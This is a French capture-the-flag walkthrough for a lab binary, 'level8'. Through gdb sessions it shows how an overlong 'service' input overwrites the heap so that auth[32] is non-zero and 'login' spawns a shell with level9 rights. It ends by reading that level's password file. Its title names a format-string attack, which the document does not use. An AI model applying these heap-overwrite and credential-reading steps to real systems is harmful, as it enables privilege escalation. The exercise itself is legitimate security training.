# Format String Exploitation

En décompilant le programme, on observe qu'il y a différents tests pour arriver à une condition finale. Si cette condition est respectée, alors un `shell` avec les droits de `level9` sera lancé.
Observons la condition nécessaire permettant d'exécuter un `shell`.
```C
eax = auth;
eax = *((eax + 0x20));
if (eax != 0) {
	system ("/bin/sh");
	goto label_0;
}
```
Si on traduit le code décompilé pour avoir un code un plus clair, cette condition est : 
```C
if (auth[32] != '\0') {
	system ("/bin/sh");`
}
```
En effet, `0x20` équivaut à 32 en base10.

Globalement, le code est une boucle infinie, qui attend différentes entrées. Si l'entrée est valide, on passera à la prochaine demande d'entrée.Il va donc nous falloir plusieurs étapes pour arriver à la conditon finale vu précédement. 

On remarque dans la première partie du code, que l'entrée attendu semble être `auth `.
```C
 puVar6 = (uint8_t *)"auth ";
    do {
      ...
```

Pour valider notre condition finale, la méthode la plus simple serait donc d'écrire `auth ` suivis de plus de 32 caractères afin que `auth[32]` soit différent de `\0`.
Le reste du code n'étant pas très explicite, nous allons manipuler la `stack` pour essayer de mieux comprendre.

```C
_auth = (undefined4 *)malloc(4);
*_auth = 0;
if (uVar3 < 0x1f) {
  strcpy(_auth, acStack139);
}
```

Ce bout de code semble être une condition liée à notre input. Si on saisis moins de 30 caractères, il y à un `strcpy` d'effectué. Nous allons tenter de vérifier cette hypothèse avec `gdb` en mettant un `breakpoint` au niveau du `strcpy` lorsqu'on saisis moins de 31 caractères, et lorsqu'on en saisis plus, afin de voir, si on rentre dans notre fonction.

```
> gdb level8
[...]
> (gdb) disas main
[...]
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:	lea    0x20(%esp),%eax
[...]
> (gdb) b *0x0804863d
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth AAAA

Breakpoint 1, 0x0804863d in main ()
> (gdb) b *0x0804863d
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, (nil)
```

Notre hypothèse est vérifié. Lorsqu'on saisis moins de 31 caractères, on rentre dans le `strcpy`. Si on en saisit plus, on ne rentre pas dedans. 

Nous allons donc afficher la valeur de `auth  ` juste après le `strcpy`.

```
> (gdb) b *0x0804863d
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth AAAA

Breakpoint 1, 0x0804863d in main ()
> (gdb) ni
[...]
> (gdb) x $esp
0xbffff670:	0x0804a008
> (gdb) x/s 0x0804a008
0x804a008:	"AAAA\n"
```

On retrouve bien nos `AAAA`, qui ont été copié dans `auth `.
Nous ne pourrons pas saisir 32 caractères après `auth `, puisque ces caractères ne seront pas copiés. Nous allons donc devoir trouver une autre solution pour arriver à notre condition finale qui est `auth[32] != '\0`.

On voit dans le début du code qu'il y a un printf qui va nous afficher les adresses de `auth ` et `service`. On connait déjà l'adresse de `auth ` puisqu'on viens de manipuler la stack. 
Pour connaitre l'adresse de `service`, il nous suffit de lancer le programme, de saisir `auth ` ainsi que `service` et voir le retour de `printf`.

```C
printf("%p, %p \n", _auth, _service);
```

```
> ./level8
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

Nous avons bien retrouvé l'adresse de `auth ` : `0x804a008`. Nous avons maintenant l'adresse de `service` : `0x804a018`. 
On remarque que l'adresse de `service` est décalé de `0x10` octets. 
Encore une fois, le reste du code n'est pas particulièrement explicite, et nous allons  tenter de vérifier si lorsqu'on saisis `service`, notre input va passé dans un `strdup`.

```C
_service = strdup(auStack137);
```

Nous allons `break` au niveau de ce `strdup`, et vérifier si on rentre dans cette fonction.

```
> (gdb) disass main
[...]
   0x080486a8 <+324>:	mov    %eax,(%esp)
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    %eax,0x8049ab0
[...]
> (gdb) b *0x080486ab
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth
0x804a008, (nil)
service AAAA

Breakpoint 1, 0x080486ab in main ()
> (gdb) b *0x080486ab
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080486ab in main ()
```

Notre hypothèse était bonne. Lorsqu'on saisit `service`, on va rentrer dans la fonction `strdup`. Nous avons testé avec peu de caractères, mais également avec un grand nombres. On observe qu'il n'y a manifestement pas de limitation au niveau de `service`.

Nous allons maintenant afficher la stack.

```
> (gdb) b *0x080486ab
[...]
> (gdb) r
[...]
auth AAAA
0x804a008, (nil)
service BBBB

Breakpoint 1, 0x080486ab in main ()
> (gdb) x/4wx $esp
0xbffff670:	0xbffff697	0x00000080	0xb7fd1ac0	0xb7fd0ff4
> (gdb) ni
[...]
> (gdb)  x/s 0x0804a008
0x804a008:	 "AAAA\n"
> (gdb)  x/12wx 0x0804a008
0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000011
0x804a018:	0x42424220	0x00000a42	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x 0x0804a008+0x20
0x804a028:	0x00000000
```
Nous avons `break` au niveau du `strdup`, puis nous avons été à la `next instruction`. 
On a affiché `auth ` et on retrouve bien nos `AAAA`.
On a également visualisé les adresses de `auth ` et `service`, et on remarque bien que nos `BBBB` ont été copié dans `service`.

On remarque que `adresse` de `auth + 0x20` est égal à `0`. `0x20` est égal à 32 en `base 10`. 
La condition `auth + 0x20` est donc la même que `auth[32]`. 
Nous avons vu précédement qu'il n'y avait pas de limitation avec `strdup`. On peut donc écrire suffisament de caractères sur `service` pour atteindre l'adresse de `auth + 0x20` et faire en sorte qu'elle ne soit pas égal à `\0`.

Nous pouvons faire le calcul 
```
[adresse de auth + 0x20] - [adresse de service]
0x804a028 - 0x804a018 = 0x10
```

`0x10` est égal à `16` en `base10`. Nous devons donc écrire 16 caractères après `service` pour atteindre l'adresse de `auth + 0x20` et donc lancer un `shell`. On peut vérifier ça dans `gdb`.

```
> (gdb) r
[...]
(nil), (nil)
auth AAAA
0x804a008, (nil)
serviceBBBBBBBBBBBBBBBB

Breakpoint 1, 0x080486ab in main ()
> (gdb) ni
0x080486b0 in main ()
> (gdb) x/20wx 0x0804a008
0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000019
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
> (gdb) x/s 0x0804a008+0x20
0x804a028:	 "\n"
```

On voit bien que `auth+0x20` n'est plus vide. Notre condition `auth[32] != '\0'` est bien respécté.
On suppose d'après le code, qu'il va falloir que notre dernière entrée soit `login` pour que la conditon `auth[32] != '\0'` soit effectuée. On va vérifier cela dans `gdb`.

```
> (gdb) disass main
[...]
  0x080486e2 <+382>:	mov    0x8049aac,%eax
  0x080486e7 <+387>:	mov    0x20(%eax),%eax
  0x080486ea <+390>:	test   %eax,%eax
[...]
```

On observe ici que le programme va mettre `0x20` dans `eax`. Puis il y a un test de `eax, eax`.
Nous pouvons break à `0x080486e7` afin de voir si le programme `break` lorsqu'on saisit `login`.

```
> (gdb) b *0x080486e7
Breakpoint 4 at 0x80486e7
> (gdb) r
[...]
auth AAAA
0x804a008, (nil)
serviceBBBBBBBBBBBBBBBB
0x804a008, 0x804a018
login

Breakpoint 4, 0x080486e7 in main ()
> (gdb) x/16wx 0x804a008
0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000019
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
> (gdb) c
Continuing.
$
```

Notre hypothèse est vérifié, lorsqu'on saisis `login`, le condition est bien effectuée. Il nous suffit de continuer, et un shell se lance puisque `auth[32] != '\0'`.

```
> ./level8
[...]
> auth 
0x804a008, (nil)
> service AAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
> login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
``` 
